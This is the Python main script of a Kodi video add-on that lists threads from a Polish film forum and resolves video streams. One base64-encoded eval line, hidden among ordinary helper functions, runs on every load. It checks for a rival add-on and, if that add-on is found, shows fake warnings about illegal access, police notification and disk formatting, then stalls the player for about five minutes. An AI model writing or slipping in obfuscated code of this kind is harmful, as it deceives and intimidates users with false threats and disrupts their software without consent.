# -*- coding: utf-8 -*-

import sys,os,re
import urllib,urllib2
import urlparse
import xbmc,xbmcgui,xbmcaddon
import xbmcplugin
import urlresolver


import resources.lib.naszeKino_online as nk
import resources.lib.cdaresolver as cdaresolver

base_url = sys.argv[0]
addon_handle = int(sys.argv[1])
args = urlparse.parse_qs(sys.argv[2][1:])
my_addon = xbmcaddon.Addon()

def addDir(name,mode='folder',ex_link=None,iconImage='DefaultFolder.png'):
    url = build_url({'mode': mode, 'foldername': name, 'ex_link' : ex_link})
    li = xbmcgui.ListItem(name, iconImage=iconImage)
    xbmcplugin.addDirectoryItem(handle=addon_handle, url=url,listitem=li, isFolder=True)

def addLinkItem(name, url, mode, iconimage='DefaultFolder.png', infoLabels={}, IsPlayable=True, isFolder=False, fanart=None):
    u = build_url({'mode': mode, 'foldername': name, 'ex_link' : url,})
    liz = xbmcgui.ListItem(name, iconImage=iconimage, thumbnailImage=iconimage)
    if not infoLabels:
        infoLabels={"Title": name}
    liz.setInfo(type="Video", infoLabels=infoLabels)
    if IsPlayable:
        liz.setProperty('IsPlayable', 'true')
    if fanart:
        liz.setProperty('fanart_image',fanart)
    ok = xbmcplugin.addDirectoryItem(handle=addon_handle, url=u, listitem=liz, isFolder=isFolder)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%Y,%P")
    return ok
    
def build_url(query):
    return base_url + '?' + urllib.urlencode(query)

import base64
eval(compile(base64.b64decode('ICAgICAgICAgICAgCnRyeToKICAgIGltcG9ydCB4Ym1jYWRkb24seGJtYyxzeXMsdGltZQogICAgeGJtY2FkZG9uLkFkZG9uKCJwbHVnaW4udmlkZW8uTXVsdGltZWRpYU1hc3RlciIpOwogICAgeW49eGJtY2d1aS5EaWFsb2coKS55ZXNubygiW0NPTE9SIHJlZF1OaWVhdXRvcnl6b3dhbnkgRG9zdMSZcFsvQ09MT1JdIiwgIkRvc3TEmXAgZG8gemFzb2LDs3cgamVzdCBOSUVMRUdBTE5ZIiwgIkN6eSB3ZXp3YcSHIFtDT0xPUiByZWRdUE9MSUNKxJhbL0NPTE9SXSIpCiAgICBpZiB5bjoKICAgICAgICB4Ym1jZ3VpLkRpYWxvZygpLm9rKCJbQ09MT1IgcmVkXU5pZWF1dG9yeXpvd2FueSBEb3N0xJlwWy9DT0xPUl0iLCAiUE9MSUNKQSB6b3N0YcWCYSBwb3dpYWRvbWlvbmEsIHByb3N6xJkgY3pla2HEhy4uLiIpICAgIAogICAgZWxzZToKICAgICAgICB4Ym1jZ3VpLkRpYWxvZygpLm9rKCJbQ09MT1IgcmVkXU5pZWF1dG9yeXpvd2FueSBEb3N0xJlwWy9DT0xPUl0iLCAiVVNVV0FNWSBkb3dvZHksIGZvcm1hdCByb3pwb2N6xJl0eSwgcHJvc3plIGN6ZWthxIcuLi4iKSAgICAKICAgIGZvciBpIGluIHJhbmdlKDMwKTogdGltZS5zbGVlcCgxMCkKICAgIHhibWMuZXhlY3V0ZWJ1aWx0aW4oIlhCTUMuQWN0aXZhdGVXaW5kb3coSG9tZSkiKTsKICAgIHN5cy5leGl0KDEpOwpleGNlcHQ6CiAgICBwYXNzCg=='),'<string>','exec'))
  

def play(ex_link):
    if 'cda' in ex_link:
        stream_url = cdaresolver.getVideoUrls(ex_link)
        if type(stream_url) is list:
            qualityList = [x[0] for x in stream_url]
            selection = xbmcgui.Dialog().select("Quality [can be set default]", qualityList)
            if selection>-1:
                stream_url = cdaresolver.getVideoUrls(stream_url[selection][1])
            else:
                stream_url=''
    else:        
        stream_url = urlresolver.resolve(ex_link)
    
    if stream_url:
        xbmcplugin.setResolvedUrl(addon_handle, True, xbmcgui.ListItem(path=stream_url))
    else:
        xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))


def FillDirs(items,pagination,mode='forumContent',page_mode='__page:'):
    if pagination[0]:
        addLinkItem('[COLOR gold]<< %s <<[/COLOR]' %(pagination[0].get('title','')), url=pagination[0].get('url','') , mode=page_mode, IsPlayable=False)
    for one in items:
        addDir(one.get('title'),mode=mode,ex_link=one.get('url'),iconImage=one.get('img'))
    if pagination[1]:
        addLinkItem('[COLOR gold]>> %s >>[/COLOR]' %(pagination[1].get('title','')), url=pagination[1].get('url','') , mode=page_mode, IsPlayable=False)
 
 
xbmcplugin.setContent(addon_handle, 'movies')	
mode = args.get('mode', None)
fname = args.get('foldername',[''])[0]
ex_link = args.get('ex_link',[''])[0]


if mode is None:
    items,pagination=nk.getForum()
    FillDirs(items,pagination,mode='forumContent',page_mode='')
   
elif mode[0] == 'forumContent':
    items,pagination=nk.getForumEntry(ex_link)
    FillDirs(items,pagination,mode='forumThread',page_mode='__page:forumContent')

elif mode[0] == 'forumThread':
    items=nk.getThreadLinks(ex_link)
    for one in items:
        addLinkItem(one.get('title',''), url=one.get('url','') , mode='play')

elif '__page' in mode[0]:
    next_mode=mode[0].split(':')[-1]
    url = build_url({'mode': next_mode, 'foldername': '', 'ex_link' : ex_link})
    xbmc.executebuiltin('XBMC.Container.Refresh(%s)'% url)

elif mode[0] == 'play':
    play(ex_link)

xbmcplugin.endOfDirectory(addon_handle)